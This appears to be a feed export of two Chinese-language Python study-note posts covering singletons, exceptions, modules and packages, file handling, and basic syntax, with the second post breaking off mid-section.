单例设计模式</h1><p>设计模式：前任工作的总结和<code>提炼</code>，为了可重用代码，让代码更容易被人理解</p><p>单列设计模式：机制：当你第一次实例化这个类的时候，就创建一个实例化的对象，当你之后再实例化，就用之前创建的对象，把原来的重复的属性覆盖，而不同的属性则继承下来</p><h2 id="重写-new-方法"><a href="#重写-new-方法" class="headerlink" title="重写__new__方法"></a>重写<code>__new__</code>方法</h2><p>利用<code>__new__</code>方法</p><p>使用<strong>类名()</strong>创建对象时，Python解释器首先会调用<code>__new__</code>方法为对象<strong>分配空间</strong></p><p>主要作用：</p><ol><li>在内存中为对象分配空间</li><li>返回对象的引用</li></ol><p>Python的解释器获得对象的引用后，将引用作为<strong>第一个参数</strong>，传递给<code>__init__</code>方法</p><blockquote><p> 重写<code>__new__</code>方法的代码非常固定</p><p> 一定要<code>return super().__new__(cls)</code></p><p> 否则Python解释器得不到分配了空间的对象引用，就会调用对象的初始化方法</p><p> 在调用时需要主动传递<code>cls</code>参数（静态方法）</p></blockquote><p><code>*</code>：多参数元组形式</p><p><code>**</code>：多参数字典形式</p><pre><code class="python"># 例子1class Person:    def __new__(cls, *args, **kwargs):        print(&#39;test&#39;)        instance = super().__new__(cls)        return instance    def __init__(self, name):        self.name = namename1 = Person(&#39;alex&#39;)</code></pre><pre><code class="python"># 例子2class DataTest:    __instance = False    def __init__(self, name,id):        self.name = name        self.id = id    def __new__(cls, *args, **kwargs):        # 判断属性是否赋值        if cls.__instance:            return cls.__instance        cls.__instance = object.__new__(cls)        return cls.__instancedata = DataTest(&#39;alex&#39;,&#39;1&#39;)nas = DataTest(&#39;nice&#39;,&#39;2&#39;)print(data)print(nas)</code></pre><h2 id="初始化方法执行一次"><a href="#初始化方法执行一次" class="headerlink" title="初始化方法执行一次"></a>初始化方法执行一次</h2><p>让初始化方法只执行一次：</p><ol><li>标记是否执行过初始化方法</li><li>在<code>__init__</code>进行判断</li><li>然后修改标记</li></ol><pre><code class="python">class Person:    info = False    __instance = False    def __new__(cls, *args, **kwargs):        # 判断属性是否赋值        if cls.__instance:            return cls.__instance        cls.__instance = object.__new__(cls)        return cls.__instance    def __init__(self, name):        if Person.info:            return        self.name = name        Person.info = Truename1 = Person(&#39;alex&#39;)print(name1)name2 = Person(&#39;alex2&#39;)print(name2)</code></pre><h1 id="0x07-异常"><a href="#0x07-异常" class="headerlink" title="0x07 异常"></a>0x07 异常</h1><h2 id="异常和错误的概念"><a href="#异常和错误的概念" class="headerlink" title="异常和错误的概念"></a>异常和错误的概念</h2><p><code>错误：</code>语法错误，逻辑错误</p><p><code>异常</code>：程序运行时发生的错误信号 程序一旦发生错误，就从错误的位置停下来，不在继续执行后面的内容</p><blockquote><p>Ps：抛出异常的一瞬间，程序并不会立即终止，而是会把异常传递给函数/方法的调用一方，如果传递到主程序，任然没有异常处理，程序才会被终止</p></blockquote><p><strong>基础语法</strong></p><pre><code class="python">try:    被检测的代码块except:    try中一旦检测到异常，就会执行这个位置的逻辑</code></pre><h2 id="异常类"><a href="#异常类" class="headerlink" title="异常类"></a>异常类</h2><table><thead><tr><th>异常名称</th><th>描述</th></tr></thead><tbody><tr><td>BaseException</td><td>所有异常的基类</td></tr><tr><td>SystemExit</td><td>解释器请求退出</td></tr><tr><td>KeyboardInterrupt</td><td>用户中断执行(通常是输入^C)</td></tr><tr><td>Exception</td><td>常规错误的基类</td></tr><tr><td>StopIteration</td><td>迭代器没有更多的值</td></tr><tr><td>GeneratorExit</td><td>生成器(generator)发生异常来通知退出</td></tr><tr><td>StandardError</td><td></td></tr><tr><td>ArithmeticError</td><td>所有数值计算错误的基类</td></tr><tr><td>FloatingPointError</td><td>浮点计算错误</td></tr><tr><td>OverflowError</td><td>数值运算超出最大限制</td></tr><tr><td>ZeroDivisionError</td><td>除(或取模)零 (所有数据类型)</td></tr><tr><td>AssertionError</td><td>断言语句失败</td></tr><tr><td>AttributeError</td><td>对象没有这个属性</td></tr><tr><td>EOFError</td><td>没有内建输入,到达EOF 标记</td></tr><tr><td>EnvironmentError</td><td>操作系统错误的基类</td></tr><tr><td>IOError</td><td>输入/输出操作失败</td></tr><tr><td>OSError</td><td>操作系统错误</td></tr><tr><td>WindowsError</td><td>系统调用失败</td></tr><tr><td>ImportError</td><td>导入模块/对象失败</td></tr><tr><td>LookupError</td><td>无效数据查询的基类</td></tr><tr><td>IndexError</td><td>序列中没有此索引(index)</td></tr><tr><td>KeyError</td><td>映射中没有这个键</td></tr><tr><td>MemoryError</td><td>内存溢出错误(对于Python 解释器不是致命的)</td></tr><tr><td>NameError</td><td>未声明/初始化对象 (没有属性)</td></tr><tr><td>UnboundLocalError</td><td>访问未初始化的本地变量</td></tr><tr><td>ReferenceError</td><td>弱引用(Weak reference)试图访问已经垃圾回收了的对象</td></tr><tr><td>RuntimeError</td><td>一般的运行时错误</td></tr><tr><td>NotImplementedError</td><td>尚未实现的方法</td></tr><tr><td>SyntaxError</td><td>Python 语法错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>TabError</td><td>Tab 和空格混用</td></tr><tr><td>SystemError</td><td>一般的解释器系统错误</td></tr><tr><td>TypeError</td><td>对类型无效的操作</td></tr><tr><td>ValueError</td><td>传入无效的参数</td></tr><tr><td>UnicodeError</td><td>Unicode 相关的错误</td></tr><tr><td>UnicodeDecodeError</td><td>Unicode 解码时的错误</td></tr><tr><td>UnicodeEncodeError</td><td>Unicode 编码时错误</td></tr><tr><td>UnicodeTranslateError</td><td>Unicode 转换时错误</td></tr><tr><td>Warning</td><td>警告的基类</td></tr><tr><td>DeprecationWarning</td><td>关于被弃用的特征的警告</td></tr><tr><td>FutureWarning</td><td>关于构造将来语义会有改变的警告</td></tr><tr><td>OverflowWarning</td><td>旧的关于自动提升为长整型(long)的警告</td></tr><tr><td>PendingDeprecationWarning</td><td>关于特性将会被废弃的警告</td></tr><tr><td>RuntimeWarning</td><td>可疑的运行时行为(runtime behavior)的警告</td></tr><tr><td>SyntaxWarning</td><td>可疑的语法的警告</td></tr><tr><td>UserWarning</td><td>用户代码生成的警告</td></tr></tbody></table><blockquote><p> Tips：<code>异常类只能用来处理指定的异常情况，如果非指定异常则无法处理</code></p></blockquote><pre><code class="python">s1 = &#39;hello&#39;try:    int(s1)except IndexError as e:    print e</code></pre><h2 id="多分支与万能异常"><a href="#多分支与万能异常" class="headerlink" title="多分支与万能异常"></a>多分支与万能异常</h2><p><strong>多分支</strong></p><pre><code class="python">s1 = &#39;hello&#39;try:    int(s1)except IndexError as e:    print(e)except KeyError as e:    print(e)except ValueError as e:    print(e)</code></pre><p><strong>万能异常（Exception）：</strong></p><ul><li><p>捕获任意异常</p><pre><code class="python">try:    被检测的代码块except Exception as e:    print(e)</code></pre></li></ul><p><strong>主动抛出异常</strong>：根据应用程序特有的业务需求主动抛出异常</p><ol><li>创建一个<code>Exception</code>的对象</li><li>使用<code>raise</code>关键字抛出异常对象</li></ol><p><code>raise</code>：显示引发异常，一旦执行了raise语句，raise后面的语句将不能执行</p><pre><code class="python">raise [Exception [, args [, traceback]]]</code></pre><pre><code class="python">def input_pwd():    pwd = input(&quot;请输入密码&quot;)    if len(pwd) &gt;= 8:        return pwd    print(&quot;错误&quot;)    ex = Exception(&quot;密码长度不够8位&quot;)    raise extry:    print(input_pwd())except Exception as result:    print(result)</code></pre><p>如果你想要的效果是，对于不同的异常我们需要定制不同的处理逻辑，那就需要用到多分支</p><pre><code class="python]">s1 = &#39;hello&#39;try:    int(s1)except IndexError as e:    print(e)except KeyError as e:    print(e)except ValueError as e:    print(e)except Exception as e:    print(e)</code></pre><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>无论异常是否发生，在程序结束前，finally中的语句都会被执行 finally和return相遇的时候，依然会执行 函数里做异常处理用，不管是否异常去做一些收尾工作</p><pre><code class="python">try:    被检测的代码块finally:    print(&#39;xxxx&#39;)</code></pre><pre><code class="python"># -*- coding: UTF-8 -*-def tryTest():      try:          demo = input(&quot;input a number:&quot;)          x = 1.0/int(demo)          print x          return 1     except Exception, e:          print e          return 0     finally:          print &quot;this is a finally test&quot; if __name__ == &#39;__main__&#39;:    result = tryTest()      print result</code></pre><h1 id="0x08-模块"><a href="#0x08-模块" class="headerlink" title="0x08 模块"></a>0x08 模块</h1><p><code>模块</code>：一个模块就是一个包含了python定义和声明的文件，文件名就是模块名+.py的后缀</p><p>在模块中定义的全局变量，函数，类都是提供给外界直接使用的工具</p><p><code>import</code>加载的模块分为四个通用类别：</p><ol><li>使用python编写的代码（.py文件）</li><li>已被编译为共享库或DLL的C或C++扩展</li><li>包好一组模块的包</li><li>使用C编写并链接到python解释器的内置模块</li></ol><p>模块可以包含可执行的语句和函数定义，这些语句的目的是初始化模块 它们只在模块名第一遇到导入import语句时才执行 为了防止你重复导入</p><p>python的优化手段：第一次导入后就将模块加载到内存了，后续的iimport语句仅是对已加载大内存中的模块对象增加一个引用，不会重新执行模块内的语句</p><blockquote><p>Ps：从<code>sys.modules</code>中找到当前已经加载的模块，<code>sys.modules</code>是一个字典，内部包含模块名与模块对象的映射，该字典决定了导入模块时是否需要重新导入</p></blockquote><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>每个模块都是一个独立的名称空间，定义在这个模块中的函数，把这个模块的名称当做全局名称空间 这样我们在编写自己的模块时，就不用担心我们定义在自己模块中全局变量会被导入时，与使用者的全局变量冲突</p><p><strong>原则</strong>：每一个文件都应该是可以被导入的，<code>在导入文件时，文件中所有没有任何缩进的代码，都会被执行一遍</code></p><p>首次导入模块时会做的三件事</p><ul><li>为源文件创建新的名称空间</li><li>在新建命名空间中执行模块中包含的代码</li><li>创建名称***来引用该命名空间</li></ul><ul><li><p><code>import</code>导入</p><pre><code class="python">import 模块1,模块2</code></pre><p>导入之后：通过<code>模块名.</code>使用模块提供的工具 – 全局变量，函数，类</p><blockquote><p>Ps：在导入模块时，每个导入应独占一行</p></blockquote></li><li><p><code>from...import...</code>导入</p><pre><code class="python">from 模块 import 方法# 例子from time import sleep</code></pre><p>如果希望从某一个模块中，导入部分的函数功能，就可以使用</p><p>直接使用模块提供的函数</p><blockquote><p>Ps：如果两个模块，存在同名的函数，那么导入模块的函数，会覆盖掉先导入的函数</p></blockquote></li><li><p><code>from...import *</code>（仅限了解）</p><pre><code class="python">from time import *</code></pre><p>导入所有的方法和属性</p><blockquote><p>不推荐使用，因为函数重名并有任何的提示，出现问题不好debug</p></blockquote></li></ul><h2 id="指定模块别名"><a href="#指定模块别名" class="headerlink" title="指定模块别名"></a>指定模块别名</h2><p>使用<code>as</code></p><p>在模块名太长的情况下，可以使用<code>as</code>指定模块的名称</p><pre><code class="python">import 模块 as 模块别名#例子import time as f</code></pre><blockquote><p>Ps：模块别名应该符合大驼峰命名规则，<code>form...import</code>导入方式同样适用</p></blockquote><h2 id="模块搜索顺序"><a href="#模块搜索顺序" class="headerlink" title="模块搜索顺序"></a>模块搜索顺序</h2><p>python的解释器在导入模块时：</p><ol><li>搜索当前目录指定模块名的文件，如果有就直接导入</li><li>没有，再搜索系统目录</li></ol><blockquote><p>在开发时，给文件起名，不要和系统的模块文件重名</p></blockquote><p><code>__file__</code>：查看模块的完整路径</p><pre><code class="python">import randomprint(random.__file__)</code></pre><h2 id="在模块文件中测试"><a href="#在模块文件中测试" class="headerlink" title="在模块文件中测试"></a>在模块文件中测试</h2><p>使用<code>__name__</code>属性,记录着一个字符串</p><p><code>__name__</code>：在其他脚本调用（导入）的的时候<strong>name</strong>显示的是模块的名字 而在原模块调用的时候显示的是<code>__main__</code></p><pre><code class="python">if __name__ == &#39;__main__&#39;:    pass</code></pre><p>通过上面的方式，python就可以分清楚哪些是主函数，进入函数执行，并且可以调用其他模块的各个函数等等</p><h1 id="0x09-包（Package）"><a href="#0x09-包（Package）" class="headerlink" title="0x09 包（Package）"></a>0x09 包（Package）</h1><p><code>包</code>：一个<strong>包含多个模块的特殊目录</strong>，目录下有一个<strong>特殊的文件</strong><code>__init__.py</code></p><p>包即模块 import导入文件时，产生名称空间中的名字来源于文件，import包，产生的名称空间的名字同样来源于文件，即包下的<code>__init__.py</code>，导入包本质就是在导入该文件</p><p>在python3中，即使包下没有<code>__init__.py</code>文件，import包任然不会报错</p><p>在python2中，包下一定要有该文件，否则import包会报错</p><blockquote><p>Ps：导入包遵循的原则：<code>凡是在导入时带点的，点的左边都必须是一个包，否则非法</code>，item.subitem.subsubitem 对于导入后，在使用时就没有这种限制了，点的左边可以是包，模块，函数(它们都可以用点的方式调用自己的属性)</p></blockquote><p><img src="%5Cimages%5Cpython%5C%E5%8C%85%5C%E5%8C%85.png" srcset="/img/loading.gif" alt=""></p><pre><code class="python">import 包名</code></pre><p><code>from...import...</code>导入</p><pre><code class="python">from glance.api import policy</code></pre><blockquote><p> Ps：from后import导入的模块，必须是明确的一个不能带点，否则会有语法错误</p><p> <code>_init_.py</code>文件 不管是哪种方式，只要是第一次导入包或是包的任意其他部分，都会依次执行包下的<code>__init__.py</code>这个文件可以为空，但是也可以存放一些初始化包的代码</p></blockquote><h2 id="绝对导入和相对导入"><a href="#绝对导入和相对导入" class="headerlink" title="绝对导入和相对导入"></a>绝对导入和相对导入</h2><ul><li><p>绝对导入</p><pre><code class="python">格式：from glance.api import policy# 路径图glance/                   ├── __init__.py      from glance import api                     from glance import cmd                     from glance import db├── api                  │   ├── __init__.py  from glance.api import policy                     from glance.api import versions│   ├── policy.py│   └── versions.py├── cmd                 from glance.cmd import manage│   ├── __init__.py│   └── manage.py└── db                   from glance.db import models    ├── __init__.py    └── models.py</code></pre></li><li><p>相对导入</p><blockquote><p><code>.</code>或<code>..</code>的方式为起始</p></blockquote><pre><code class="python">格式：from .api import policy# 路径图glance/                   ├── __init__.py      from . import api  #.表示当前目录                     from . import cmd                     from . import db├── api                  │   ├── __init__.py  from . import policy                     from . import versions│   ├── policy.py│   └── versions.py├── cmd              from . import manage│   ├── __init__.py│   └── manage.py    from ..api import policy   #..表示上一级目录，想再manage中使用policy中的方法就需要回到上一级glance目录往下找api包，从api导入policy└── db               from . import models    ├── __init__.py    └── models.py</code></pre><blockquote><p>Ps：一定要在与glance同级的文件中测试 包里的模块如果想使用其他模块的内容只能使用相对路径，使用了相对路径就不能在包内直接执行了 可以用import导入内置或者第三方模块，但是要绝对避免使用import来导入自定义包的子模块， 应使用from…import…的绝对或者相对导入且包的相对导入只能用from的形式</p></blockquote></li></ul><h2 id="单独导入"><a href="#单独导入" class="headerlink" title="单独导入"></a>单独导入</h2><p>单独导入包名称时不会导入包中所有包含的所有子模块</p><p>在glance同级中的.py文件中</p><pre><code>import glanceglance.api.policy()&#39;&#39;&#39;结果：AttributeError: module &#39;glance&#39; has no attribute &#39;cmd&#39;&#39;&#39;&#39;</code></pre><p>解决方法</p><pre><code class="python"># glance/__init__.pyfrom . import cmd# glance/cmd/__init__.pyfrom . import manage</code></pre><p>再次执行</p><pre><code class="python"># 在于glance同级的.py中import glanceglance.api.policy()</code></pre><h2 id="init-py文件"><a href="#init-py文件" class="headerlink" title="__init__.py文件"></a><code>__init__.py</code>文件</h2><p>要在外界使用包的模块，需要再<code>__init__.py</code>中指定<code>对外界提供的模块列表</code></p><p>当前目录下导入</p><pre><code class="python">from . import send_message</code></pre><p><img src="%5Cimages%5Cpython%5C%E5%8C%85%5Cinit.png" srcset="/img/loading.gif" alt=""><br><img src="%5Cimages%5Cpython%5C%E5%8C%85%5Capi.png" srcset="/img/loading.gif" alt=""><br><img src="%5Cimages%5Cpython%5C%E5%8C%85%5Cinit_import.png" srcset="/img/loading.gif" alt=""></p><h2 id="all"><a href="#all" class="headerlink" title="all"></a>all</h2><p><code>__all__</code>可用于模块导入时限制 此时被导入模块若定义了<code>__all__</code>属性，则只有all内指定的属性，方法，类可被导入</p><pre><code class="python">glance/                   ├── __init__.py     from .api import *                    from .cmd import *                    from .db import *    ├── api                  │   ├── __init__.py   __all__ = [&#39;policy&#39;,&#39;versions&#39;] │   ├── policy.py│   └── versions.py├── cmd               __all__ = [&#39;manage&#39;]    │   ├── __init__.py│   └── manage.py    └── db                __all__ = [&#39;models&#39;]                  ├── __init__.py    └── models.pyimport glancepolicy.get()</code></pre><h2 id="发布模块及安装"><a href="#发布模块及安装" class="headerlink" title="发布模块及安装"></a>发布模块及安装</h2><ul><li><p>创建setup.py</p><pre><code class="python">   from distutils.core import setup</code></pre><p>setup( name = “包名”,<br>​        version = “版本”,<br>​        description = “描述信息”,<br>​        long_description = “完整描述”,<br>​        author = “作者”,<br>​        url = “主页”,<br>​        py_modules = [<br>​            “包.模块”，..]<br>)</p><pre><code></code></pre></li><li><p>构建模块</p><pre><code class="python">python3 setup.py build</code></pre></li><li><p>生成发布压缩包</p><pre><code class="python">python3 setup.py sdist</code></pre></li></ul><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><ol><li>先解压</li><li>进行安装</li></ol><pre><code class="python">tar -zxvf 压缩包sudo python3 setup.py install</code></pre><h3 id="卸载模块"><a href="#卸载模块" class="headerlink" title="卸载模块"></a>卸载模块</h3><p>直接从安装目录下，把安装模块的目录删除就可以</p><pre><code>cd /usr/loacl/lib/python3.x/dist-packages/sudo rm -r 模块*</code></pre><h3 id="pip-安装第三方模块"><a href="#pip-安装第三方模块" class="headerlink" title="pip 安装第三方模块"></a>pip 安装第三方模块</h3><pre><code class="python">sudo pip3 install 模块名</code></pre><h3 id="安装IPython"><a href="#安装IPython" class="headerlink" title="安装IPython"></a>安装IPython</h3><pre><code># MAC下sudo pip install ipython# Linux下sudo apt install ipythonsudo apt install ipython3</code></pre><h1 id="0x10-文本操作"><a href="#0x10-文本操作" class="headerlink" title="0x10 文本操作"></a>0x10 文本操作</h1><p><code>文件</code>：存储在某种长期储存设备上的一段数据</p><p><code>文件的作用</code>：将数据长期保存下来，在需要的时候使用</p><p><code>文件存储方式</code>：以二进制的方式保存在磁盘上的</p><p><strong>文本文件</strong>：</p><ul><li>可以使用文本编辑软件查看</li><li>本质上还是二进制文件</li></ul><p><strong>二进制文件</strong>：</p><ul><li>保存的内容不是给人直接阅读的，而是提供给其他软件使用的</li><li>二进制文件不能使用文本编辑软件查看</li></ul><h2 id="文件的基本操作"><a href="#文件的基本操作" class="headerlink" title="文件的基本操作"></a>文件的基本操作</h2><p>基本步骤：</p><ul><li><p>打开（<code>open()</code>）</p></li><li><p>读/写</p><ul><li><p>读</p><pre><code class="python">readlines()    #读取所有行的内容readline(n)    #n：代表最长字节数，视频，图片，（rb,bytes按照字节读）read()    #读取所有行的内容</code></pre></li><li><p>写</p><pre><code class="python">write()</code></pre></li></ul></li><li><p>关闭(<code>close()</code>)</p></li></ul><h2 id="文件指针-光标"><a href="#文件指针-光标" class="headerlink" title="文件指针(光标)"></a>文件指针(光标)</h2><p>文件指针<code>标记</code>从哪个位置开始读取数据</p><p>第一次打开文件时，通常文件指针会指向文件的开始位置</p><p>当执行了<code>read</code>方法后，文件指针会移动到<strong>读取内容的末尾</strong></p><ul><li><p><code>file.sekk()</code></p><p>移动文件读取指针到指定位置</p><pre><code class="python">sekk(offset,whence=0)&#39;&#39;&#39;offset：开始的偏移量，也就是代表需要移动偏移的字节数whence：给offset参数一个定义，表示要从哪个位置开始偏移，0代表从文件开头算起，1代表开始从当前位置开始算起，2代表从文件末尾开始算起，当有换行时，会被换行截断seek()无返回值&#39;&#39;&#39;</code></pre></li><li><p><code>tell()</code></p><p>tell是获取文件指针位置</p></li><li><p><code>truncate()</code></p><p>用于截断文件并返回截断的字节长度</p><pre><code class="python">fileObject.truncate([size])</code></pre></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p><code>readable()</code></p><p>是否可读可写</p></li><li><p><code>writable()</code></p><p>是否可写</p></li></ul><h2 id="删除文件与重命名"><a href="#删除文件与重命名" class="headerlink" title="删除文件与重命名"></a>删除文件与重命名</h2><pre><code class="python">import os# 删除文件os.remove()# 重命名os.rename(&#39;xxxx.txr&#39;,&#39;rrrr&#39;)</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python基础</title>
    <link href="/2019/08/19/Python/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/08/19/Python/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>该文章都是摘自一些视频的笔记和一些博客！<br><a href="http://www.cnblogs.com/jin-xin/articles/7459977.html" target="_blank" rel="noopener">http://www.cnblogs.com/jin-xin/articles/7459977.html</a></p><hr><h1 id="0x01-python种类"><a href="#0x01-python种类" class="headerlink" title="0x01 python种类"></a>0x01 python种类</h1><h2 id="CPython"><a href="#CPython" class="headerlink" title="CPython"></a>CPython</h2><p>当我们从Python官方网站下载并安装好Python3.6后，我们就直接获得了一个<strong>官方版本的解释器：CPython</strong><br>这个解释器是用C语言开发的</p><p>在命令行下运行python就是启动CPython解释器</p><a id="more"></a><h2 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h2><p>是<strong>基于CPython之上的一个交互式解释器</strong></p><p><strong>Cpython</strong>用：<code>&gt;&gt;&gt;</code>作为提示符<br><strong>IPython</strong>用：<code>In[序号]：</code>作为提示符</p><h2 id="PyPy"><a href="#PyPy" class="headerlink" title="PyPy"></a>PyPy</h2><p>是另一个Python解释器，它的目标是执行速度</p><p>PyPy采用JIT技术，<strong>对Python代码进行动态编译</strong>（注意不是注释）</p><p>绝大部分Python代码都可以在PyPy下运行，但是PyPy和CPython有一些不同</p><p>这就导致相同的python代码再两种解释器下执行可能会有不同的结果</p><h2 id="Jython"><a href="#Jython" class="headerlink" title="Jython"></a>Jython</h2><p><strong>运行在Java平台上的Python解释器</strong>，可以直接把Python代码编译成Java字节码执行</p><h2 id="IronPython"><a href="#IronPython" class="headerlink" title="IronPython"></a>IronPython</h2><p><strong>运行在微软.Net平台上的Python解释器</strong>，可以直接把Python代码编译成.Net的字节码</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Python的解释器很多，但使用最广泛的还是CPython。如果要和Java或.Net平台交互，最好的办法不是用Jython或IronPython，而是通过网络调用来交互，确保各程序之间的独立性</p><hr><h1 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02 变量"></a>0x02 变量</h1><p>变量是为了存储信息被调用，并且还提供方式标记,数据,描述性理解更清晰</p><p>变量在程序中就是用一个<code>变量名表示</code><br>变量名必须是<code>大小写英文</code>,<code>数字</code>和<code>_</code>的组合，且<code>不能用数字开头</code></p><pre><code class="python">a = 1t_007 = &#39;007&#39; #这个一个字符串</code></pre><p>等号<code>=</code>是赋值语句,把任意数据类型赋值给变量,同一个变量可以反复赋值，而且可以是不同类型的变量</p><pre><code class="python">a = 123print(a) #a是整数a = &#39;abc&#39; #a变为字符串print(a)</code></pre><p>变量本身类型不固定的语言称之为<code>动态语言</code>，与之对应的是静态语言</p><p>静态语言在定义变量时必须<code>指定变量类型</code>，如果赋值的时候类型不匹配,就会报错</p><p>最后理解在计算机内存中的表示也非常重要,当我们写：</p><pre><code>a = &#39;ABC&#39;</code></pre><p><strong>Python解释器干了两件事</strong></p><ul><li>在内存中创建了一个’ABC’的字符串</li><li>在内存中创建了一个名为<code>a</code>的变量,并把它指向’abc’</li></ul><h2 id="变量定义规则"><a href="#变量定义规则" class="headerlink" title="变量定义规则"></a>变量定义规则</h2><ul><li>变量名只能是 字母、数字或下划线的任意组合</li><li>变量名的第一个字符不能是数字</li><li>以下关键字不能声明为变量名<pre><code>and, as, assert, break, classcontinue, def, del, elif, elseexcept, exec, finally, for, fromglobal, if, import, in, islambda, not, or, pass, printraise, return, try, while, with, yield</code></pre></li></ul><h2 id="推荐定义方式"><a href="#推荐定义方式" class="headerlink" title="推荐定义方式"></a>推荐定义方式</h2><ul><li>驼峰体</li></ul><pre><code class="python">AgeOfOldboy = 56NumberOfStudents = 80</code></pre><ul><li>下划线</li></ul><pre><code class="python">age_of_oldboy = 56number_of_students = 80</code></pre><hr><h1 id="0x03常量"><a href="#0x03常量" class="headerlink" title="0x03常量"></a>0x03常量</h1><p>所谓常量就是<strong>不能变的变量</strong>，比如常用的数字常数π就是一个常量</p><p>在Python中,通常用<code>全部大写的变量名表示常量</code></p><pre><code class="python">PI = 3.15159265359</code></pre><p>事实上任然是一个<code>常量</code>,<strong>在Python根本没有任何机制保证PI不会被改变</strong><br>所以,用全部大写的变量名表示常量只是一个习惯上的用法</p><p><code>python是不区分常量和变量的</code></p><hr><h1 id="0x04-字符编码"><a href="#0x04-字符编码" class="headerlink" title="0x04 字符编码"></a>0x04 字符编码</h1><p>python解释器在加载<code>.py</code>文件中代码时,<code>会对内容进行编码(默认ascill)</code><br>ascii码无法将世界上的各种文字和字符全部显示，所以就需要新出一种可以代表所有字符和符号的编码 即:<code>unicode</code></p><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p><code>Unicode</code>(统一码,万国码)是一种在计算机上使用的字符编码</p><p>Unicode是为了解决传统的字符编码方案的局限而产生的<br>他为每种语言中的每个字符设定了统一并且唯一的二进制编码,规定虽有的字符和符号最少由16位来表示(2字节) 2**16 = 65536</p><h2 id="utf-8"><a href="#utf-8" class="headerlink" title="utf-8"></a>utf-8</h2><p><code>utf-8</code> 是对Unicode编码的压缩和优化,它不再使用最少使用2个字节,而是将所有的字符和符号进行分类</p><h2 id="python2-x-3-x-默认编码"><a href="#python2-x-3-x-默认编码" class="headerlink" title="python2.x/3.x 默认编码"></a>python2.x/3.x 默认编码</h2><p>ASCII码中的内容用1个字节保存<br>欧洲的字符用2个字节保存<br>东南亚的字符用3个字节保存。。。</p><p>所以,python解释器在加载.py文件中的代码时,会对内容进行编码(默认为ascill)<br>而输入中文的话,会报错(ASCII码无法支持中文)</p><p>ASCII ==&gt; GB2312 ==&gt; gbk1.0 ==&gt; gb18030<br>ASCII ==&gt; Unicode ==&gt; utf-8 </p><p>Python2.x == ASCII 默认编码<br>Python3.x == Unicode 默认编码</p><hr><h1 id="0x05-注释"><a href="#0x05-注释" class="headerlink" title="0x05 注释"></a>0x05 注释</h1><ul><li>单行注释</li></ul><pre><code class="python"># 被注释的内容</code></pre><ul><li>多行注释</li></ul><pre><code class="python">&#39;&#39;&#39;被注释内容&#39;&#39;&#39;或&quot;&quot;&quot;被注释内容&quot;&quot;&quot;</code></pre><hr><h1 id="0x06-输入-输出"><a href="#0x06-输入-输出" class="headerlink" title="0x06 输入/输出"></a>0x06 输入/输出</h1><h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><p>用<code>print()</code>在括号中加上字符串,就可以向屏幕上输出指定的文字</p><pre><code class="python">print(&quot;hello&quot;)</code></pre><p><strong>可以接受多个字符串</strong>，用<code>,</code>逗号隔开,就可以连成一串输出</p><pre><code class="python">print(&quot;The quick brown fox&quot;,&#39;jumps over&#39;,&#39;the lazy dog&#39;)</code></pre><p><code>print()</code>会依次打印每个字符串</p><blockquote><p>遇到逗号<code>,</code>会输出一个空格</p></blockquote><h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><p><code>input()</code>可以让用户输入一个字符串,并放到一个变量里</p><pre><code class="python">name = imput()</code></pre><hr><h1 id="0x07-数据类型"><a href="#0x07-数据类型" class="headerlink" title="0x07 数据类型"></a>0x07 数据类型</h1><h2 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h2><p>python可以处理任意大小的整数,包括负整数</p><blockquote><p>例如: 1,-1,8080 等等之类的数字</p></blockquote><p>计算机由于使用<code>二进制</code>，所以有时候用十六进制表示整数比较方便，十六进制<code>0x</code>开头</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><p>浮点数也就是小数<br>浮点数运算则可能会有四舍五入的误差</p><pre><code class="python">name = 0.00001</code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>字符串是以单引号<code>&#39;</code>，或双引号<code>&quot;</code>括起来的任意文字</p><blockquote><p>Tips：<code>&#39;&#39;</code>或<code>&quot;&quot;</code>本身只是一种表示方式,不是字符串的一部分</p></blockquote><pre><code class="python">name = &#39;my name&#39;</code></pre><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><blockquote><p>Tips：字符串的拼接只能是双方都是字符串，不能跟数字或其他类型拼接</p></blockquote><ul><li><code>+</code></li></ul><pre><code class="python">name = &quot;xiao san&quot;age = &quot;22&quot;print(&quot;小三的信息是：&quot;+name+age)</code></pre><ul><li><code>*</code></li></ul><pre><code>name = &quot;xiao san&quot;age = &quot;22&quot;# 相城就是复制自己多次再拼接在一起print(name * 10)</code></pre><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><p>只要把要打印的格式先准备好，由于里面的一些信息是需要用户输入的，你没办法预设知道<br>因此可以先放置个占位符，再把字符串里面的占位符与外部的变量做个映射关系</p><h4 id="占位符"><a href="#占位符" class="headerlink" title="% 占位符"></a>% 